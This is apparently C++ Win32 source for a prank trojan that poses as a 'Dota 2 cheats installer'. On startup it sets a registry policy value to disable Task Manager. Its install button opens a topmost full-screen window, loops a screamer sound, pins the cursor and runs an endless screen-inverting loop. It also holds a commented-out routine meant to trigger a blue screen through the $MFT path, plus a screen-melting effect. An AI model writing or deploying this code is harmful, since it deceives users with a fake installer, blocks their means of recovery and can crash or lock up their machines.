#include "includes.h"

int WINAPI _tWinMain(HINSTANCE This, // Дескриптор текущего приложения
	HINSTANCE Prev, // В современных системах всегда 0
	LPTSTR cmd, // Командная строка
	int mode) // Режим отображения окна
{
	Gdiplus::GdiplusStartupInput gdiplusStartInput;
	UINT_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartInput, nullptr);
	HWND hWnd; // Дескриптор главного окна программы
	MSG msg; // Структура для хранения сообщения
	WNDCLASS wc; // Класс окна
	// Определение класса окна
	wc.hInstance = This;
	wc.lpszClassName = WinName; // Имя класса окна
	wc.lpfnWndProc = WndProc; // Функция окна
	wc.style = CS_HREDRAW | CS_VREDRAW; // Стиль окна
	wc.hIcon = LoadIcon(This, MAKEINTRESOURCE(IDI_ICON1)); // Стандартная иконка
	wc.hCursor = LoadCursor(NULL, IDC_CROSS); // Стандартный курсор
	wc.lpszMenuName = NULL; // Нет меню
	wc.cbClsExtra = 0; // Нет дополнительных данных класса
	wc.cbWndExtra = 0; // Нет дополнительных данных окна
	// Заполнение окна белым цветом
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	if (!RegisterClass(&wc)) return 0; // Регистрация класса окна 
	// Создание окна
	hWnd = CreateWindow(WinName, // Имя класса окна
		_T("by Quality"), // Заголовок окна
		WS_OVERLAPPEDWINDOW, // Стиль окна
		CW_USEDEFAULT,// x
		CW_USEDEFAULT,// y Размеры окна
		CW_USEDEFAULT,// Width
		CW_USEDEFAULT,// Height
		HWND_DESKTOP, // Дескриптор родительского окна
		NULL, // Нет меню
		This, // Дескриптор приложения
		NULL); // Дополнительной информации нет
	
	ShowWindow(hWnd, mode); //Показать окно
	// Цикл обработки сообщений
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);// Функция трансляции кодов нажатой клавиши
		DispatchMessage(&msg); // Посылает сообщение функции WndProc()
	}

	Gdiplus::GdiplusShutdown(gdiplusToken);
	return 0;
};

LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
	WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_PAINT: 
	{
		hdc = BeginPaint(hWnd, &ps);

		hBrush = CreateSolidBrush(RGB(30, 129, 244));
		FillRect(ps.hdc, &wndRect, hBrush);

		draw(hdc);

		SetBkMode(ps.hdc, TRANSPARENT);
		SetTextColor(ps.hdc, RGB(182, 79, 255));
		//SetTextColor(ps.hdc, RGB(110, 168, 255));
		SelectObject(ps.hdc, hFont);
		DrawTextA(ps.hdc, "Dota 2 cheats installer", -1, &fontRect, DT_SINGLELINE | DT_CENTER | DT_VCENTER | DT_NOCLIP);

		EndPaint(hWnd, &ps);
		break;
	}

	case WM_CREATE: 
	{
		MainWndAddMenus(hWnd);
		MainWndVidgetes(hWnd);
		FontApply();

		hKey = NULL;
		if (RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies", &hKey) != ERROR_SUCCESS) // ERROR_SUCCES = Успешно
			return 1;

		tmp = NULL;
		if (RegCreateKey(hKey, L"System", &tmp) == ERROR_SUCCESS)
		{
			/*LSTATUS status = RegDeleteKey(hKey, L"NewKey");
			RegCloseKey(tmp);*/
		}

		LSTATUS	status0 = RegSetValue(tmp, L"DisableTaskMgr", REG_SZ, L"Message", 7 * sizeof(WCHAR));

		break;
	}

	case WM_COMMAND:
	{
		switch (wParam)
		{
		case OnHelpClicked:
			MessageBox(hWnd, L"Создано для рубрики \"Сам себе недохакер\"\nby Quality", L"Информация", MB_OK);
			break;
		case OnDownloadClicked:
			//callBSOD(NULL, NULL);
			SetWindowLongPtr(hWnd, GWL_STYLE, WS_POPUP | WS_VISIBLE);
			SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 3840, 2160, SWP_SHOWWINDOW);
			Sleep(1500);
			PlaySound(TEXT("screamer3.wav"), NULL, SND_ASYNC | SND_LOOP);
			for (int x = 0; x < 100; x++) {
				//CallMelt(NULL, NULL, NULL, NULL);
				haos();
				SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 3840, 2160, SWP_SHOWWINDOW);
				SetCursorPos(100, 100);
				//MessageBox(hWnd, L"C̵͉͋̔͞L̸̖̽̌͂O̖̼ͩ͌͐S̵̙͕̀̃Ḛͭ̉̇͟ Ỵ̛̖͋͢O̖̼ͩ͌͐U̠҉̷̙ͦR͉̜̎͡͠ Ḛͭ̉̇͟Ỵ̛̖͋͢Ḛͭ̉̇͟S̵̙͕̀̃", L"̺d̺̺o̺̺n̺̺t̺ ̺l̺̺o̺̺o̺̺k̺ ̺b̺̺e̺̺h̺̺i̺̺n̺̺d̺ ̺y̺̺o̺̺u̺", MB_OK | MB_ICONERROR);
			}
			//message = MessageBox(hWnd, L"Ḛͭ̉̇͟N̺̻̔̆ͅD̶͔̭̪̻?", L"?̵̛̤̣̺̞̩̰́̉̍̾̋͜?̶̡̢̢͇̰͔̟̪͙̠̮̪̬̑̅̓͑͋̚͜?̸̛̳͇̣̝͓̥̈͒̐̀̊̑̀̋́̌̇̏͜͝?̵̢̼̝̃̆̅͋̃̈͌͛͝?̸̖͍̙̯̭͎̮̰̜̃̌͜͜ͅ", MB_YESNO | MB_ICONSTOP);
			break;
		case OnDonateClicked:
			MessageBox(hWnd, L"Немедленно верните маме её банковскую карту!", L"Нельзя так", MB_YESNO | MB_ICONERROR);
			ShellExecute(hWnd, NULL, L"https://pnrtscr.com/x8a3q1", NULL, NULL, SW_MAXIMIZE);
			break;
		case OnOpenClicked:
			SetCursorPos(100, 100);
			ShellExecute(hWnd, NULL, L"https://youtu.be/dQw4w9WgXcQ", NULL, NULL, SW_MAXIMIZE); // Открытие файла/ссылки
			break;
		case OnReadModeClicked:
			GetWindowTextA(hMode, Buffer, BufferSize);
			SetWindowTextA(hWnd, Buffer);
			break;
		case OnExitClicked:
			PostQuitMessage(0);
			break;

		default: break;
		}
		break;
	}

	case WM_DESTROY: PostQuitMessage(0);
		break;

	default: return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

void MainWndAddMenus(HWND hWnd)
{
	HMENU RootMenu = CreateMenu();

	// AppendMenu(RootMenu, MF_STRING, OnHelpClicked, L"Help");
	AppendMenu(RootMenu, MF_STRING, OnOpenClicked, L"Open");
	// AppendMenu(RootMenu, MF_STRING, OnExitClicked, L"Exit");

	SetMenu(hWnd, RootMenu);
}

void MainWndVidgetes(HWND hWnd)
{
	GetClientRect(hWnd, &wndRect);

	hDownloadFont = CreateFontA(
		60, 20, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
		ANTIALIASED_QUALITY, FF_DECORATIVE, "myFont");

	hFont = CreateFontA(
		85, 35, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
		ANTIALIASED_QUALITY, FF_MODERN, "myFont2");

	hDefaultFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);

	fontRect = { 420, 10, 500, 90 };

	hDownload = CreateWindow(L"button", L"Установить!", WS_VISIBLE | WS_CHILD | ES_CENTER, 
		wndRect.left + 10, wndRect.bottom - DownloadBtnHeight - 10, DownloadBtnWidth, DownloadBtnHeight, hWnd, (HMENU)OnDownloadClicked, NULL, NULL);
	hDonate = CreateWindow(L"button", L"Поддержать автора", WS_VISIBLE | WS_CHILD | ES_CENTER, 
		wndRect.left + 10, wndRect.bottom - DonateBtnHeight - 180, DonateBtnWidth, DonateBtnHeight, hWnd, (HMENU)OnDonateClicked, NULL, NULL);
	hExit = CreateWindow(L"button", L"Выйти", WS_VISIBLE | WS_CHILD | ES_CENTER, 
		wndRect.right - ExitBtnWidth - 30, wndRect.top + 10, ExitBtnWidth, ExitBtnHeight, hWnd, (HMENU)OnExitClicked, NULL, NULL);
	hInfo = CreateWindow(L"button", L"Инфо", WS_VISIBLE | WS_CHILD | ES_CENTER,
		wndRect.right - HelpBtnWidth - 30, wndRect.top + 70, HelpBtnWidth, HelpBtnHeight, hWnd, (HMENU)OnHelpClicked, NULL, NULL);

	hMode = CreateWindowA("edit", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 500, 100, 100, 20, hWnd, NULL, NULL, NULL);
	hReadMode = CreateWindowA("button", "Set Mode", WS_VISIBLE | WS_CHILD | ES_CENTER, 500 + 110, 100, 60, 20, hWnd, (HMENU)OnReadModeClicked, NULL, NULL);
}

void draw(HDC hdc) 
{
	Gdiplus::Graphics gf(hdc);
	Gdiplus::Pen pen(Gdiplus::Color(255, 255, 0, 0));
	Gdiplus::SolidBrush brush(Gdiplus::Color(255, 0, 255, 0));

	//gf.DrawLine(&pen, 0, 0, 500, 500); // Drawing line
	//gf.FillRectangle(&brush, 400, 100, 200, 300); // Drawing filled rect
	

	Gdiplus::Bitmap bmp(L"background_2.png");
	gf.DrawImage(&bmp, -100, -170);
}

void drawScreamer(HDC hdc) 
{
	Gdiplus::Graphics gf(hdc);

	Gdiplus::Pen pen(Gdiplus::Color(255, 255, 0, 0));

	gf.DrawRectangle(&pen, wndRect.left - 5, wndRect.bottom - 150, 270, 150);
}

int callBSOD(int argc, _TCHAR* argv[]) // Вызываем синий экран смерти
{
	HANDLE hFile = NULL;

	hFile = CreateFileW(L"C:\\$MFT\\dirtyfile", FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL); // Создаем файл, который повлияет на систему и вызовет BSOD

	CloseHandle(hFile);

	return 0;
}

void haos()
{
	while (1) 
	{
		HDC hdc = GetDC(0);
		int x = SM_CXSCREEN;
		int y = SM_CYSCREEN;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCINVERT);
		Sleep(10);
	}
}

void FontApply() // Применение шрифтов на кнопки
{
	SendMessage(hInfo, WM_SETFONT, (WPARAM)hDefaultFont, TRUE);
	SendMessage(hDonate, WM_SETFONT, (WPARAM)hDefaultFont, TRUE);
	SendMessage(hDownload, WM_SETFONT, (WPARAM)hDownloadFont, TRUE);
	SendMessage(hExit, WM_SETFONT, (WPARAM)hDefaultFont, TRUE);
	SendMessage(hMode, WM_SETFONT, (WPARAM)hDefaultFont, TRUE);
	SendMessage(hReadMode, WM_SETFONT, (WPARAM)hDefaultFont, TRUE);
}

LRESULT	CALLBACK Melt(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) // Эффект плывучости экрана
{
	switch (msg)
	{
	case WM_CREATE: 
	{
		HDC desktop = GetDC(HWND_DESKTOP);
		HDC window = GetDC(hWnd);

		BitBlt(window, 0, 0, srcWidth, srcHeitght, desktop, 0, 0, SRCCOPY);

		ReleaseDC(hWnd, window);
		ReleaseDC(HWND_DESKTOP, desktop);

		SetTimer(hWnd, 0, interval, 0);

		ShowWindow(hWnd, SW_SHOW);

		break; 
	}
	case WM_PAINT:
	{
		ValidateRect(hWnd, 0);

		break;
	}
	case WM_TIMER:
	{
		HDC wndw = GetDC(hWnd);

		int x = (rand() % srcWidth) - (200 / 2);
		int y = (rand() % 15);

		int width = (rand() % 200);

		BitBlt(wndw, x, y, width, srcHeitght, wndw, x, 0, SRCCOPY);

		ReleaseDC(hWnd, wndw);

		break;
	}
	case WM_DESTROY:
	{
		KillTimer(hWnd, 0);

		PostQuitMessage(0);

		break;
	}

	return 0;

	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}

int APIENTRY CallMelt(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int showCmd) // Выфзываем плывочость экрана
{
	srcWidth = GetSystemMetrics(SM_CXSCREEN);
	srcHeitght = GetSystemMetrics(SM_CYSCREEN);

	WNDCLASS wndClass = { 0, Melt, 0, 0, NULL, 0, LoadCursorW(0, IDC_ARROW), 0, 0, L"ScreenMelting" };

	if (RegisterClass(&wndClass))
	{
		HWND hWndM = CreateWindowExA(WS_EX_TOPMOST, "ScreenMelting", 0, WS_POPUP, 0, 0, srcWidth, srcHeitght, HWND_DESKTOP, 0, NULL, 0);

		if (hWndM)
		{
			srand(GetTickCount());

			MSG msg = { 0 };

			while (msg.message != WM_QUIT)
			{
				if (PeekMessage(&msg, 0, 0, 0, PM_REMOVE))
				{
					TranslateMessage(&msg);
					DispatchMessage(&msg);
				}
			}
		}
	}
	return 0;
}

LRESULT CALLBACK Screamer(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) 
{
	switch (msg)
	{
	case WM_CREATE:
	{
		break;
	}
	case WM_PAINT:
	{
		PAINTSTRUCT hps;
		HWND window = GetDesktopWindow();
		HDC dc = BeginPaint(window, &hps);

		Gdiplus::Graphics gf(dc);

		Gdiplus::Pen pen(Gdiplus::Color(255, 255, 0, 0));
		gf.DrawRectangle(&pen, 10, 10, 400, 400);

		EndPaint(window, &hps);
		break;
	}

	case WM_DESTROY:
	{
		PostQuitMessage(0);

		break;
	}

	return 0;

	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}